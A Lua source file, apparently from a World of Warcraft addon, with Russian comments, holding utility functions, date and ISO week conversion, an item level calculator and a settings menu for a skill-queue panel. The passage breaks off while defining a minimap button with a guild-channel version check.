-- Локальные функции и переменные для оптимизации
local pairs = pairs
local table_insert = table.insert
local string_gmatch = string.gmatch
local string_lower = string.lower
local utf8sub = utf8mySub
local math_abs = math.abs
local math_floor = math.floor
local utf8len = utf8myLen

-- Функция для разделения строки на подстроки по заданному разделителю
function mysplit(inputString, separator)
    separator = separator or "%s"  -- Если разделитель не задан, используем пробел как разделитель по умолчанию
    local resultTable = {}  -- Создаем пустую таблицу для хранения результатов
    for substring in string_gmatch(inputString, "([^"..separator.."]+)") do
        table_insert(resultTable, substring)  -- Добавляем каждую подстроку в результат
    end
    return resultTable  -- Возвращаем таблицу с подстроками
end

-- Функция для подсчета количества элементов в таблице
function tablelength(inputTable)
    local elementCount = 0  -- Переменная для подсчета количества элементов
    for _ in pairs(inputTable) do 
        elementCount = elementCount + 1 
    end
    return elementCount  -- Возвращаем общее количество элементов
end

-- -- Таблица для конвертации чисел в символы
-- local _convertTable = {
--     [0] = "0", [1] = "1", [2] = "2", [3] = "3", [4] = "4",
--     [5] = "5", [6] = "6", [7] = "7", [8] = "8", [9] = "9",
--     [10] = "A", [11] = "B", [12] = "C", [13] = "D", [14] = "E",
--     [15] = "F", [16] = "G", [17] = "#", [18] = "$", [19] = "%",
--     [20] = "(", [21] = ")", [22] = "*", [23] = "+", [24] = "-",
--     [25] = "/", [26] = ";", [27] = "<", [28] = "=", [29] = ">",
--     [30] = "@", [31] = "H", [32] = "I", [33] = "J", [34] = "K",
--     [35] = "L", [36] = "M", [37] = "N", [38] = "O", [39] = "P",
--     [40] = "Q", [41] = "R", [42] = "S", [43] = "T", [44] = "U",
--     [45] = "V", [46] = "W", [47] = "X", [48] = "Y", [49] = "Z",
--     [50] = "^", [51] = "_", [52] = "`", [53] = "a", [54] = "b",
--     [55] = "c", [56] = "d", [57] = "e", [58] = "f", [59] = "g",
--     [60] = "h", [61] = "i", [62] = "j", [63] = "k", [64] = "l",
--     [65] = "m", [66] = "n", [67] = "o", [68] = "p", [69] = "q",
--     [70] = "r", [71] = "s", [72] = "t", [73] = "u", [74] = "v",
--     [75] = "w", [76] = "x", [77] = "y", [78] = "z", [79] = "{",
--     [80] = "|", [81] = "}", [82] = "[", [83] = "]", [84] = "'",
-- }

-- -- Обратная таблица для быстрого поиска
-- local _reverseConvertTable = {}
-- for k, v in pairs(_convertTable) do
--     _reverseConvertTable[v] = k
-- end

-- -- Функция для преобразования десятичного числа в строку в 90-ричной системе
-- local function Convert(dec, base)
--     local result = ""
--     repeat
--         local remainder = dec % base
--         result = _convertTable[remainder] .. result
--         dec = math_floor(dec / base)
--     until dec == 0
--     return result
-- end

-- -- Функция для кодирования числа в строку
-- function numCod(dec)
--     dec = math_abs(dec)
--     return Convert(dec, 85)
-- end

-- -- Функция для декодирования строки в число
-- function numeCod(encoded)
--     local number = 0
--     for i = 1, #encoded do
--         local char = encoded:sub(i, i)
--         local value = _reverseConvertTable[char] or 0
--         number = number * 85 + value
--     end
--     return number
-- end

-- Функция для инвертирования словаря
function invert_dict(table)
    local inverted_dict = {}
    for i = 1, #table do
        inverted_dict[i] = {}
        for key, value in pairs(table[i]) do
            inverted_dict[i][value] = key
        end
    end
    return inverted_dict
end

-- Функция для логирования
function log(...)
    local args = {...}
    local result = table.concat(args, " ")
    print(result)
    if ChatFrame3 then
        ChatFrame3:AddMessage(result)
    end
end

function unixToDate(unixTime)
    -- Проверка ввода
    if type(unixTime) ~= "number" or unixTime < 0 then
        return "Invalid Unix time", nil, nil
    end

    -- Получаем таблицу даты (в WoW используется date(), а не os.date())
    local dateTable = date("*t", unixTime)
    if not dateTable then
        return "Invalid date", nil, nil
    end

    -- Форматируем дату в строку
    local dateString = string.format("%04d-%02d-%02d %02d:%02d:%02d",
        dateTable.year, dateTable.month, dateTable.day,
        dateTable.hour, dateTable.min, dateTable.sec)

    -- Корректно определяем день недели (ISO 8601: понедельник=1, воскресенье=7)
    local dayOfWeek = dateTable.wday - 1
    if dayOfWeek == 0 then
        dayOfWeek = 7  -- Воскресенье (в WoW wday=1) → в ISO=7
    end

    -- Точный расчёт номера недели по ISO 8601
    local function getISOWeekNumber(y, m, d)
        -- Используем алгоритм, соответствующий стандарту
        local t = { year = y, month = m, day = d }
        local timestamp = time(t)
        if not timestamp then return nil end

        local dateInfo = date("*t", timestamp)
        local year, month, day = dateInfo.year, dateInfo.month, dateInfo.day

        -- Находим четверг этой недели (по ISO неделя начинается с понедельника)
        local dayOfWeekISO = dayOfWeek  -- уже преобразован в ISO (пн=1, вск=7)
        local thursdayOffset = 4 - dayOfWeekISO  -- 4 = четверг
        local thursdayDay = day + thursdayOffset

        -- Корректируем, если вышли за границы месяца
        local thursdayTimestamp = time({
            year = year,
            month = month,
            day = thursdayDay
        })
        if not thursdayTimestamp then
            -- Если не удалось (например, 30 февраля), используем альтернативный метод
            local tempDate = date("*t", timestamp + (thursdayOffset * 86400))
            year, month, day = tempDate.year, tempDate.month, tempDate.day
        else
            local thursdayDate = date("*t", thursdayTimestamp)
            year, month, day = thursdayDate.year, thursdayDate.month, thursdayDate.day
        end

        -- Первая неделя года — это та, где есть 4 января
        local jan4Timestamp = time({ year = year, month = 1, day = 4 })
        if not jan4Timestamp then return nil end
        local jan4Date = date("*t", jan4Timestamp)
        local jan4Weekday = jan4Date.wday - 1
        if jan4Weekday == 0 then jan4Weekday = 7 end  -- ISO коррекция

        local yearStartTimestamp = time({ year = year, month = 1, day = 1 })
        if not yearStartTimestamp then return nil end
        local daysSinceYearStart = math.floor((timestamp - yearStartTimestamp) / 86400) + 1

        local weekNum = math.floor((daysSinceYearStart + jan4Weekday - 1) / 7) - math.floor((jan4Weekday - 1) / 7)
        
        -- Коррекция для первых и последних недель года
        if weekNum < 1 then
            -- Это последняя неделя предыдущего года
            local lastYear = year - 1
            local dec31Timestamp = time({ year = lastYear, month = 12, day = 31 })
            if not dec31Timestamp then return 52 end  -- fallback
            local dec31Weekday = date("*t", dec31Timestamp).wday - 1
            if dec31Weekday == 0 then dec31Weekday = 7 end
            if dec31Weekday <= 4 then
                return 52
            else
                return 53
            end
        elseif weekNum > 52 then
            -- Проверяем, может ли год иметь 53 недели
            local dec31Timestamp = time({ year = year, month = 12, day = 31 })
            if not dec31Timestamp then return 52 end  -- fallback
            local dec31Weekday = date("*t", dec31Timestamp).wday - 1
            if dec31Weekday == 0 then dec31Weekday = 7 end
            if dec31Weekday >= 4 then  -- Если 31 декабря = четверг или позже → 53 недели
                return 53
            else
                return 1  -- Иначе это уже 1 неделя следующего года
            end
        end

        return weekNum
    end

    local weekNumber = getISOWeekNumber(dateTable.year, dateTable.month, dateTable.day)

    return dateString, dayOfWeek, weekNumber
end

function NS3Menu(ver, subver)
    local menu = NSQCMenu:new("NSQC3")

    local generalSub = menu:addSubMenu("Настройки")

    menu:addSlider(generalSub, {
        name = "SizeSlider",
        label = "Window Size",
        min = -500,
        max = 500,
        step = 10,
        default = ns_dbc:getKey("настройки", "SCREEN_PADDING") or -40,
        tooltip = "Максимальное расстояние от края экрана до края поля",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "SCREEN_PADDING", value)
        end
    })

    menu:addSlider(generalSub, {
        name = "SizeSlider",
        label = "Window Size",
        min = 0,
        max = 1,
        step = 0.1,
        default = ns_dbc:getKey("настройки", "MOVE_ALPHA") or 0,
        tooltip = "Максимальная прозрачности при движении",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "MOVE_ALPHA", value)
        end
    })

    menu:addSlider(generalSub, {
        name = "SizeSlider",
        label = "Window Size",
        min = 0,
        max = 1,
        step = 0.1,
        default = ns_dbc:getKey("настройки", "FRAME_ALPHA") or 0,
        tooltip = "Прозрачность основного фрейма в видимом режиме. Требует /reload для применения",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "FRAME_ALPHA", value)
        end
    })

    menu:addSlider(generalSub, {
        name = "SizeSlider",
        label = "Window Size",
        min = 0,
        max = 1,
        step = 0.1,
        default = ns_dbc:getKey("настройки", "BUTTON_ALPHA") or 1,
        tooltip = "Прозрачность кнопок поля. Так же меняется перетаскиванием ПКМ по рамке поля: Перетащить за рамку влево или вправо и кликнуть по ней ПКМ. Если меняется здесь, требует /reload",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "BUTTON_ALPHA", value)
        end
    })

    menu:addCheckbox(generalSub, {
        name = "Никогда не показывать рамку",
        label = "Никогда не показывать рамку",
        default = false,
        tooltip = "Никогда не показывать рамку",
        onClick = function(checked)
            ns_dbc:modKey("настройки", "fullAlphaFrame", checked)
        end
    })

    menu:addCheckbox(generalSub, {
        name = "Закрывать поле при движении персонажа",
        label = "Закрывать поле при движении персонажа",
        default = true,
        tooltip = "Закрывать поле при движении персонажа",
        onClick = function(checked)
            ns_dbc:modKey("настройки", "closeFld", checked)
        end
    })

    menu:addCheckbox(generalSub, {
        name = "Не взаимодействовать с полем во время бега: клик насквозь",
        label = "Не взаимодействовать с полем во время бега: клик насквозь",
        default = false,
        tooltip = "Не взаимодействовать с полем во время бега: клик насквозь",
        onClick = function(checked)
            ns_dbc:modKey("настройки", "disableFld", checked)
        end
    })

    -- Добавляем информационные секции
    menu:addInfoSection(
        "Описание", 
        "Один аддон, чтоб миром править. Один аддон, чтоб всех найти..."
    )

    menu:addInfoSection(
        "Версия", 
        "Текущая версия: " .. ver .. "." .. subver
    )

    local skillPanel = menu:addSubMenu("  Очередь скиллов", generalSub)

    menu:addCheckbox(skillPanel, {
        name = "Видимость панели вне боя",
        label = "Показывать панель, если персонаж не в бою",
        default = (ns_dbc:getKey("настройки", "Skill Queue mode") == 2),
        tooltip = "Показывать панель, если персонаж не в бою",
        onClick = function(checked)
            local mode = checked and 2 or 1
            ns_dbc:modKey("настройки", "Skill Queue mode", mode)
            
            -- Обновляем displayMode в объекте SpellQueue
            sq.displayMode = mode
            
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addCheckbox(skillPanel, {
        name = "Взаимодействие с мышью",
        label = "Взаимодействие с мышью",
        -- Преобразуем значение из базы данных в булево значение
        default = (ns_dbc:getKey("настройки", "Skill Queue", "clickThrough") == 1), -- 1 -> true, 0 -> false
        tooltip = "Если установить, панель не будет взаимодействовать с мышью",
        onClick = function(checked)
            -- Сохраняем значение в базу данных как число: true -> 1, false -> 0
            ns_dbc:modKey("настройки", "Skill Queue", "clickThrough", checked and 1 or 0) -- true -> 1, false -> 0
            
            -- Устанавливаем режим взаимодействия с мышью
            sq:SetClickThrough(checked) -- Если чекбокс включен (true), панель пропускает клики насквозь
        end
    })

     menu:addSlider(skillPanel, {
        name = "sqAlpha",
        label = "Прозрачность панели",
        min = .1,
        max = 1,
        step = .1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "alpha") or 0.9,
        tooltip = "Ширина панели очереди скиллов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "alpha", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqSizeShirinaSlider",
        label = "Ширина панели",
        min = 50,
        max = 1000,
        step = 5,
        default = ns_dbc:getKey("настройки", "Skill Queue", "width") or 200,
        tooltip = "Ширина панели очереди скиллов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "width", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqSizeVysotaSlider",
        label = "Высота панели",
        min = 0,
        max = 300,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "height") or 32,
        tooltip = "Высота панели очереди скиллов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "height", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqSizeIcons",
        label = "Размер иконок",
        min = 5,
        max = 300,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "iconSize") or 32,
        tooltip = "Размер иконок",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "iconSize", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqIconSpacing",
        label = "Расстояние между скиллами",
        min = 0,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "iconSpacing") or 0,
        tooltip = "Расстояние между скиллами",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "iconSpacing", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqGlowSizeOffset",
        label = "Размер свечения иконки",
        min = 0,
        max = 300,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "glowSizeOffset") or 32,
        tooltip = "Размер свечения иконки",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "glowSizeOffset", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqComboSize",
        label = "Размер квадрата комбопоинтов",
        min = 0,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "comboSize") or 6,
        tooltip = "Размер квадрата комбопоинтов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "comboSize", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqComboSpacing",
        label = "Расстояние между квадратами комбо-поинтов",
        min = 0,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "comboSpacing") or 6,
        tooltip = "Расстояние между квадратами комбо-поинтов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "comboSpacing", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqcomboOffsetx",
        label = "Смещение комбопоинтов по горизонтали",
        min = -50,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "comboOffset", "x") or 6,
        tooltip = "Смещение комбопоинтов по горизонтали",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "comboOffset", "x", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqcomboOffsety",
        label = "Смещение комбопоинтов по вертикали",
        min = -100,
        max = 100,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "comboOffset", "y") or 6,
        tooltip = "Смещение комбопоинтов по вертикали",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "comboOffset", "y", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqpoisonSize",
        label = "Размер квадрата ядов",
        min = 0,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "poisonSize") or 6,
        tooltip = "Размер квадрата ядов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "poisonSize", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqpoisonSpacing",
        label = "Расстояние между квадратами ядов",
        min = 0,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "poisonSpacing") or 6,
        tooltip = "Расстояние между квадратами ядов",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "poisonSpacing", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqpoisonOffsetx",
        label = "Смещение ядов по горизонтали",
        min = -50,
        max = 50,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "poisonOffset", "x") or 6,
        tooltip = "Смещение ядов по горизонтали",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "poisonOffset", "x", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqcomboOffsety",
        label = "Смещение комбопоинтов по вертикали",
        min = -100,
        max = 100,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "poisonOffset", "y") or 6,
        tooltip = "Смещение комбопоинтов по вертикали",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "poisonOffset", "y", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqhealthBarHeight",
        label = "Высота полоски хп игрока",
        min = 1,
        max = 20,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "healthBarHeight") or 6,
        tooltip = "Высота полоски хп игрока",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "healthBarHeight", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqhealthBarOffset",
        label = "Расстояние полоски хп игрока до панели",
        min = -200,
        max = 200,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "healthBarOffset") or 6,
        tooltip = "Расстояние полоски хп игрока до панели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "healthBarOffset", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqresourceBarHeight",
        label = "Высота полоски маны игрока",
        min = 1,
        max = 20,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "resourceBarHeight") or 6,
        tooltip = "Высота полоски маны игрока",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "resourceBarHeight", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqresourceBarOffset",
        label = "Расстояние полоски маны игрока до панели",
        min = -200,
        max = 200,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "resourceBarOffset") or 6,
        tooltip = "Расстояние полоски маны игрока до панели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "resourceBarOffset", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqtargetHealthBarHeight",
        label = "Высота полоски хп цели",
        min = 1,
        max = 20,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "targetHealthBarHeight") or 6,
        tooltip = "Высота полоски хп цели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "targetHealthBarHeight", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqtargetHealthBarOffset",
        label = "Расстояние полоски хп цели до панели",
        min = -200,
        max = 200,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "targetHealthBarOffset") or 6,
        tooltip = "Расстояние полоски хп цели до панели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "targetHealthBarOffset", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqtargetResourceBarHeight",
        label = "Высота полоски маны цели",
        min = 1,
        max = 20,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "targetResourceBarHeight") or 6,
        tooltip = "Высота полоски маны цели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "targetResourceBarHeight", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addSlider(skillPanel, {
        name = "sqtargetResourceBarOffset",
        label = "Расстояние полоски маны цели до панели",
        min = -200,
        max = 200,
        step = 1,
        default = ns_dbc:getKey("настройки", "Skill Queue", "targetResourceBarOffset") or 6,
        tooltip = "Расстояние полоски маны цели до панели",
        onChange = function(value) 
            ns_dbc:modKey("настройки", "Skill Queue", "targetResourceBarOffset", value)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

    menu:addButton(skillPanel, {
        name = "ResetButton", -- Уникальное имя кнопки
        label = "Сброс настроек", -- Текст на кнопке
        width = 150, -- Ширина кнопки
        height = 30, -- Высота кнопки
        tooltip = "Это уничтожит все настроенное и скинет все настройки на дефолт", -- Подсказка при наведении
        onClick = function()
            local appearanceSettings = {
                -- Основные параметры
                width = 200,              -- Ширина всей панели
                height = 32,              -- Высота панели
                scale = 1,                -- Масштаб интерфейса
                alpha = 0.9,              -- Прозрачность в бою
                inactiveAlpha = 0.4,      -- Прозрачность вне боя
                iconSpacing = 0,          -- расстояние между иконками
                glowSizeOffset = 10,      -- На сколько больше иконки будет glow
                highlightSizeOffset = 15, -- На сколько больше иконки будет highlight
                glowAlpha = 0.3,          -- Прозрачность glow
                
                -- Игрок
                healthColor = {1, 0, 0},                 -- Цвет здоровья игрока (RGB)
                healthBarHeight = 3,                     -- Высота полосы здоровья
                healthBarOffset = 3,                     -- Смещение от верха панели
                
                resourceColor = {0, 0.8, 1},             -- Цвет ресурса (мана/ярость и т.д.)
                resourceBarHeight = 3,                   -- Высота полосы ресурса
                resourceBarOffset = 0,                   -- Смещение от полосы здоровья
                
                -- Цель
                targetHealthColor = {1, 0, 0},         -- Цвет здоровья цели
                targetHealthHeight = 3,                  -- Высота полосы здоровья цели
                targetHealthBarOffset = -3,              -- Смещение от низа панели (отрицательное - вверх)
                
                targetResourceColor = {0.5, 0, 1},       -- Цвет ресурса цели
                targetResourceHeight = 3,                -- Высота полосы ресурса цели
                targetResourceBarOffset = 0,             -- Смещение от полосы здоровья цели
                
                -- Другие элементы
                iconSize = 32,              -- Размер иконок способностей
                comboSize = 18,             -- Размер комбо-поинтов
                poisonSize = 16,            -- Размер стаков ядов
                timeLinePosition = 15,      -- Позиция временной линии
                -- Комбо-поинты
                comboSize = 6,               -- Размер квадрата
                comboSpacing = 0,            -- Расстояние между квадратами
                comboOffset = {x = 0, y = 24}, -- Смещение от панели
                
                -- Яды
                poisonSize = 6,              -- Размер квадрата
                poisonSpacing = 0,           -- Расстояние между квадратами
                poisonOffset = {x = 0, y = 24}, -- Смещение от панели
                healthBarHeight = 3,          -- высота полоски хп игрока
                healthBarOffset = 6,          -- расстояние полоски хп до панели
                resourceBarHeight = 3,
                resourceBarOffset = 0,
                targetHealthBarHeight = 3,
                targetHealthBarOffset = -6,
                targetResourceBarHeight = 3,
                targetResourceBarOffset = 0,
                clickThrough = 0
            }
            ns_dbc:modKey("настройки", "Skill Queue", appearanceSettings)
            sq:SetAppearanceSettings(ns_dbc:getKey("настройки", "Skill Queue"))
            sq:UpdateSkillTables()
            sq:ForceUpdateAllSpells()
            sq:ApplyDisplayMode()
        end
    })

     local questPanel = menu:addSubMenu("  Список квестов", generalSub)

     menu:addCheckbox(questPanel, {
        name = "Скрывать список квестов",
        label = "Скрывать список квестов",
        -- Преобразуем значение из базы данных в булево значение
        default = (ns_dbc:getKey("настройки", "questWhatchPanel") == 1), -- 1 -> true, 0 -> false
        tooltip = "Если установить, список квестов справа будет по-умолчанию скрыт",
        onClick = function(checked)
            -- Сохраняем значение в базу данных как число: true -> 1, false -> 0
            ns_dbc:modKey("настройки", "questWhatchPanel", checked and 1 or 0) -- true -> 1, false -> 0
            
            -- Устанавливаем режим взаимодействия с мышью
            sq:SetClickThrough(checked) -- Если чекбокс включен (true), панель пропускает клики насквозь
        end
    })

    local classSettings = menu:addSubMenu("  Классовые настройки", generalSub)
    local hunters = menu:addSubMenu("    Охотники", classSettings)
    
    menu:addCheckbox(hunters, {
        name = "Автосмена отслеживания целей на миникарте",
        label = "Автосмена отслеживания целей на миникарте",
        -- Преобразуем значение из базы данных в булево значение
        default = (ns_dbc:getKey("настройки", "hunterTarget") == 0), -- 1 -> true, 0 -> false
        tooltip = "Если установить, цели на миникарте будут отслеживаться автоматически те, что нужны для бонуса охотника",
        onClick = function(checked)
            -- Сохраняем значение в базу данных как число: true -> 1, false -> 0
            ns_dbc:modKey("настройки", "hunterTarget", checked and 1 or 0) -- true -> 1, false -> 0
            
            -- Устанавливаем режим взаимодействия с мышью
            sq:SetClickThrough(checked) -- Если чекбокс включен (true), панель пропускает клики насквозь
        end
    })
    C_Timer.After(2, function()
        SendAddonMessage("menu_chk " .. GetUnitName("player"), "", "GUILD")
    end)
end

function CalculateAverageItemLevel(unit)
    local totalIlvl = 0
    local mainHandEquipLoc, offHandEquipLoc

    for slot = INVSLOT_FIRST_EQUIPPED, INVSLOT_LAST_EQUIPPED do -- For every slot,
        if slot ~= INVSLOT_BODY and slot ~= INVSLOT_TABARD then -- If this isn't the shirt/tabard slot,
            local id = GetInventoryItemID(unit, slot) -- Get the ID of the item in this slot
            if id then -- If we have an item in this slot,
                local _, _, _, itemLevel, _, _, _, _, itemEquipLoc = GetItemInfo(id) -- Get the item's ilvl and equip location
                totalIlvl = totalIlvl + itemLevel -- Add it to the total

                if slot == INVSLOT_MAINHAND then -- If this is the main or off hand, store the equip location for later use
                    mainHandEquipLoc = itemEquipLoc
                elseif slot == INVSLOT_OFFHAND then
                    offHandEquipLoc = itemEquipLoc
                end
            end
        end
    end

    local numSlots
    if mainHandEquipLoc and offHandEquipLoc then -- The unit has something in both hands, set numSlots to 17
        numSlots = 17
    else -- The unit either has something in one hand or nothing in both hands
        local equippedItemLoc = mainHandEquipLoc or offHandEquipLoc

        local _, class = UnitClass(unit)
        local isFury = class == "WARRIOR" and GetInspectSpecialization() == SPECID_FURY

        -- If the user is holding a one-hand weapon, a main-hand weapon or a two-hand weapon as Fury, set numSlots to 17; otherwise set it to 16

        numSlots = (
            equippedItemLoc == "INVTYPE_WEAPON" or
            equippedItemLoc == "INVTYPE_WEAPONMAINHAND" or
            (equippedItemLoc == "INVTYPE_2HWWEAPON" and isFury)
        ) and 17 or 16
    end

    return totalIlvl / numSlots -- Return the average
end

function set_miniButton()
    -- Создаем фрейм для иконки
    miniMapButton = CreateFrame("Button", "NSQC3minibtn", Minimap)
    miniMapButton:SetSize(32, 32)  -- Размер иконки
    miniMapButton:SetFrameLevel(8)  -- Уровень фрейма
    miniMapButton:SetMovable(true)  -- Разрешаем перемещение

    -- Устанавливаем текстуры для иконки
    miniMapButton:SetNormalTexture("Interface\\AddOns\\NSQC3\\emblem.tga")
    miniMapButton:SetPushedTexture("Interface\\AddOns\\NSQC3\\emblem.tga")
    miniMapButton:SetHighlightTexture("Interface\\AddOns\\NSQC3\\emblem.tga")
    miniMapButton:Hide()
    -- Переменная для хранения актуальной версии
    local latestVersion = nil

    -- Функция для обработки входящих сообщений
    local function OnEvent(self, event, prefix, message, channel, sender)
        if prefix == "NSQC_VERSION_RESPONSE" then
            local msg = mysplit(message)
            latestVersion = msg[2]  -- Сохраняем актуальную версию
            latestSubVersion = msg[3]
        end
    end

    -- Регистрируем обработчик событий
    local eventFrame = CreateFrame("Frame")
    eventFrame:RegisterEvent("CHAT_MSG_ADDON")
    eventFrame:SetScript("OnEvent", OnEvent)

    -- Функция для создания тултипа
    -- Объявляем константы и статические строки вне функции
